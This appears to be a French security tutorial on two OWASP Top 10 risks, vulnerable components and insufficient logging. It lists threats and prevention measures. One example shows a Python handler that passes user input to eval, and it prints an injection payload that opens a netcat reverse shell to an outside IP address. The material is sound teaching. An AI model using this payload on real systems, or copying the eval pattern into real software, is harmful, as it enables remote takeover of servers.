Les composants, tels que les bibliothèques, les Framework et autres modules logiciels, s'exécutent avec les mêmes privilèges que l'application. Si un composant vulnérable est exploité, une telle attaque peut faciliter une grave perte de données ou une prise de contrôle du serveur. Les applications et les API utilisant des composants présentant des vulnérabilités connues peuvent saper les défenses des applications et permettre diverses attaques et impacts.

- **Agents de menace / vecteurs d'attaque** : bien qu'il soit facile de trouver des exploits déjà écrits pour de nombreuses vulnérabilités connues, d'autres vulnérabilités nécessitent des efforts concentrés pour développer un exploit personnalisé.
- **Faille de sécurité** : la prévalence de ce problème est très répandue. Les modèles de développement à forte composante peuvent conduire les équipes de développement à ne même pas comprendre quels composants elles utilisent dans leur application ou API, et encore moins à les maintenir à jour. Certains scanners comme retire.js aident à la détection, mais la détermination de l'exploitabilité nécessite des efforts supplémentaires.
- **Impacts** : bien que certaines vulnérabilités connues n'entraînent que des impacts mineurs, certaines des plus grandes violations à ce jour reposent sur l'exploitation de vulnérabilités connues dans les composants. Selon les actifs que vous protégez, ce risque devrait peut-être figurer en tête de liste.

------

### Vulnérabilités

Vous êtes probablement vulnérable:

- Si vous ne connaissez pas les versions de tous les composants que vous utilisez (côté client et côté serveur). Cela inclut les composants que vous utilisez directement ainsi que les dépendances imbriquées.

- Si le logiciel est vulnérable, non pris en charge ou obsolète. Cela inclut le système d'exploitation, le serveur Web / d'applications, le système de gestion de base de données (SGBD), les applications, les API et tous les composants, les environnements d'exécution et les bibliothèques.

- Si vous ne recherchez pas régulièrement les vulnérabilités et que vous vous abonnez aux bulletins de sécurité liés aux composants que vous utilisez.

- Si vous ne corrigez pas ou ne mettez pas à niveau la plate-forme, les cadres et les dépendances sous-jacents en temps opportun et en fonction des risques. Cela se produit généralement dans les environnements où l'application de correctifs est une tâche mensuelle ou trimestrielle soumise au contrôle des modifications, ce qui laisse les organisations ouvertes à de nombreux jours ou mois d'exposition inutile à des vulnérabilités fixes.

- Si les développeurs de logiciels ne testent pas la compatibilité des bibliothèques mises à jour, mises à niveau ou corrigées.

  
  
  **Attaque 1**
  
  Nous avons un site web pour vendre des vêtements.
  
  Ce site web utilise une API en ligne de commande programmé en python pour pouvoir rapidement voir les stocks de l'entreprise quand on est pas dans les locaux ainsi que modifié quand on possède les droits nécessaires ou tout autre action.
  
  Cet API fonctionne notamment avec la commande **curl** comme ceci :
  
  ```
  curl -X POST 'https://monsitedevetement.com/api/gerer_sotck/set' --data '{\"name\":\"t-shirt\",\"brand\":\"zara\",\"stock\":\"10\"}' 
  ```
  
  Cette commande permet de mettre le stock de t-shirt de la marque Zara à 10 unités.
  
  Ces paramètres seront traité dans le programme suivant :
  
  ```
  def handlePOST(request):
      data = request.POST
      if eval("data['stock']>=0"):
          self.stock = data['stock']
      else:
          raise Exception("Negative stock")
  ```
  
  On peut voir ici que nous passons un paramètre donnée par l'utilisateur à la fonction **eval** qui est risque dans ces conditions.
  
  Un attaquant ayant connaissance de cela par n'importe quel moyen peux très bien exploité cette vulnérabilités pour récupéré un Shell sur la machine par une commande de ce genre la :
  
  ```
  "__import__(\'os\').system(\'rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.10.15.1 8123 > f\') "
  ```
  
  Partant de la, c'est porte ouverte pour récupéré le total accès de la machine.
  
  
  
  ### Prévention
  
  Un processus de gestion des correctifs doit être en place pour:
  
  - Supprimez les dépendances inutilisées, les fonctionnalités inutiles, les composants, les fichiers et la documentation.
  - Inventoriez en continu les versions des composants côté client et côté serveur (par exemple les frameworks, les bibliothèques) et leurs dépendances à l'aide d'outils tels que les versions, etc. Surveillez en permanence les sources comme CVE pour détecter les vulnérabilités des composants. Utilisez des outils d'analyse de composition logicielle pour automatiser le processus. Abonnez-vous aux alertes par e-mail pour les failles de sécurité liées aux composants que vous utilisez.
  - Obtenez uniquement des composants de sources officielles via des liens sécurisés. Préférez les packages signés pour réduire les risques d'inclusion d'un composant malveillant modifié.
  - Surveillez les bibliothèques et les composants qui ne sont pas gérés ou qui ne créent pas de correctifs de sécurité pour les anciennes versions. Si l'application de correctifs n'est pas possible, envisagez de déployer un correctif visuel pour surveiller, détecter ou protéger contre le problème découvert.
  
  Chaque organisation doit s'assurer qu'il existe un plan continu de surveillance, de tri et d'application des mises à jour ou des changements de configuration pour la durée de vie de l'application ou du portefeuille.
  
  

# Insufficient Logging & Monitoring

### Définition

Le manque surveillance de tous les évènements liée a l'ordinateurs, comme les connections interne/externe, les erreurs d'exécution de programmes ou des journaux alias "log" peut amener un Hacker à continuer à attaquer un système informatique, de maintenir une persistance, et de falsifier, extraire ou détruire des données.

- **Agents de menace / vecteurs d'attaque** : l'exploitation d'une journalisation et d'une surveillance insuffisantes est le fondement de presque tous les incidents majeurs. Les attaquants comptent sur le manque de surveillance et de réponse rapide pour atteindre leurs objectifs sans être détectés.
- **Faille de sécurité** : ce problème est inclus dans le Top 10 sur la base d'une enquête de l'industrie . Une stratégie pour déterminer si vous disposez d'une surveillance suffisante consiste à examiner les journaux après les tests de pénétration. Les actions des testeurs doivent être enregistrées suffisamment pour comprendre quels dommages ils peuvent avoir infligés.
- **Impacts** : la plupart des attaques réussies commencent par un sondage de vulnérabilité. Permettre à ces sondes de continuer peut augmenter la probabilité d'un exploit réussi à près de 100%. En 2016, l'identification d'une violation a pris en moyenne 191 - beaucoup de temps pour que les dommages soient infligés.

------

### Vulnérabilités

L'enregistrement, la détection, la surveillance et la réponse active insuffisants se produisent à tout moment:

- Les événements vérifiables, tels que les ouvertures de session, les échecs de connexion et les transactions de valeur élevée ne sont pas enregistrés.
- Les avertissements et les erreurs ne génèrent aucun message de journal, insuffisant ou peu clair.
- Les journaux des applications et des API ne sont pas surveillés pour détecter toute activité suspecte.
- Les journaux ne sont stockés que localement.
- Les seuils d'alerte et les processus d'escalade des réponses appropriés ne sont pas en place ni efficaces.
- Les tests de pénétration et les analyses par les outils DAST ne déclenchent pas d'alertes.
- L'application n'est pas en mesure de détecter, d'intensifier ou d'alerter les attaques actives en temps réel ou presque en temps réel.

### Prévention

Selon le risque des données stockées ou traitées par l'application:

- Assurez-vous que tous les échecs de connexion, de contrôle d'accès et de validation des entrées côté serveur peuvent être enregistrés avec un contexte utilisateur suffisant pour identifier les comptes suspects ou malveillants, et conservés pendant suffisamment de temps pour permettre une analyse judiciaire différée.
- Assurez-vous que les journaux sont générés dans un format qui peut être facilement consommé par une solution de gestion centralisée des journaux.
- Assurez-vous que les transactions de grande valeur ont une piste d'audit avec des contrôles d'intégrité pour empêcher la falsification ou la suppression, telles que les tables de base de données à ajouter uniquement ou similaires.
- Établir une surveillance et des alertes efficaces de sorte que les activités suspectes soient détectées et traitées en temps opportun.
- Établir ou adopter un plan de réponse et de reprise après incident.

